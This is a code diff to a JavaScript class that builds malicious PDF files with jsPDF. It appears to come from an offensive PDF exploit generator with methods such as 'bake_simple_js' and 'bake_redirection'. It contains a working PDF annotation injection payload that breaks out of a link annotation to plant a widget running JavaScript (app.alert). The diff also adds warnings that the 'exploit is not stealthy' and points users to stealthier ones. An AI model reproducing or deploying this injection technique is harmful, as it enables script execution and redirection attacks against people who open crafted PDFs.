@@ -16,11 +16,12 @@ class jsPDF_template{
 		out_name = out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
+		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
 		return [out_name, this.state];
 	}
 
 
-	bake_simple_js(out_name='simple-pdf', direction){
+	bake_simple_js(out_name='simple_js', direction){
 		this.doc = new jsPDF();
 		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
 		type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});
@@ -28,6 +29,7 @@ class jsPDF_template{
 		out_name = out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
+		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
 		return [out_name, this.state];
 	}
 	bake_redirection(out_name='Redirection', direction){
@@ -38,7 +40,8 @@ class jsPDF_template{
 		out_name = out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
-		return [out_name, this.state];
+		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
+		return [out_name, this.state, direction];
 	}
 
 
@@ -53,7 +56,7 @@ class jsPDF_template{
 		out_name = out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
-		return [out_name, this.state];
+		return [out_name, this.state, direction];
 		//alert(embed.getPageLocationNormalized());
 	}
 
@@ -76,7 +79,7 @@ class jsPDF_template{
 		out_name = out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
-		return [out_name, this.state];
+		return [out_name, this.state, direction];
 	}
 
 }
